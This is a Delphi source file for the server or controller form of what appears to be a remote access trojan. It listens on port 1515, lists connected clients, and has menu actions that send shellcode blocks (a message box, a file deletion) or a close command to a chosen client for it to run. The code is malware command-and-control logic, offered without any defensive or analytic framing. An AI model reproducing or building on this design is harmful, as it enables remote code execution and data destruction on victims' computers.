unit untMain;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, Menus, ComCtrls, untServerSocket;

type
  TForm1 = class(TForm)
    ListView1: TListView;
    PopupMenu1: TPopupMenu;
    SendShellcode1: TMenuItem;
    CloseServer1: TMenuItem;
    MessageBox1: TMenuItem;
    DeleteFile1: TMenuItem;
    procedure FormCreate(Sender: TObject);
    procedure CloseServer1Click(Sender: TObject);
    procedure MessageBox1Click(Sender: TObject);
    procedure DeleteFile1Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;
  mySocketThread:TMyThread;

implementation

{$R *.dfm}
uses untClientController, untUtils, untSHMessageBox, untSHDeleteFile;



procedure TForm1.FormCreate(Sender: TObject);
begin
  mySocketThread := TMyThread.Create(True);
  mySocketThread.ListenPort := 1515;
  mySocketThread.Resume;
end;

procedure TForm1.CloseServer1Click(Sender: TObject);
var
  mTempThread:TClientThread;
begin
  if listview1.Selected <> nil then
  begin
    with listview1.Selected do
    begin
      if SubItems.Objects[0] <> nil then
      begin
        mTempThread := TClientThread(SubItems.Objects[0]);
        SendBuffer(mTempThread.mySocket, 1, nil, 1);
      end;
    end;
  end;
end;

procedure TForm1.MessageBox1Click(Sender: TObject);
var
  mTempThread:TClientThread;
begin
  if listview1.Selected <> nil then
  begin
    with listview1.Selected do
    begin
      if SubItems.Objects[0] <> nil then
      begin
        mTempThread := TClientThread(SubItems.Objects[0]);
        SendBuffer(mTempThread.mySocket, 0, @untSHMessageBox.pMessageBox, (DWORD(@untSHMessageBox.pMessageBox_END) - DWORD(@untSHMessageBox.pMessageBox))+1);
      end;
    end;
  end;
end;

procedure TForm1.DeleteFile1Click(Sender: TObject);
var
  mTempThread:TClientThread;
begin
  if listview1.Selected <> nil then
  begin
    with listview1.Selected do
    begin
      if SubItems.Objects[0] <> nil then
      begin
        mTempThread := TClientThread(SubItems.Objects[0]);
        SendBuffer(mTempThread.mySocket, 0, @untSHDeleteFile.pDeleteFile, (DWORD(@untSHDeleteFile.pDeleteFile_END) - DWORD(@untSHDeleteFile.pDeleteFile))+1);
      end;
    end;
  end;
end;

end.
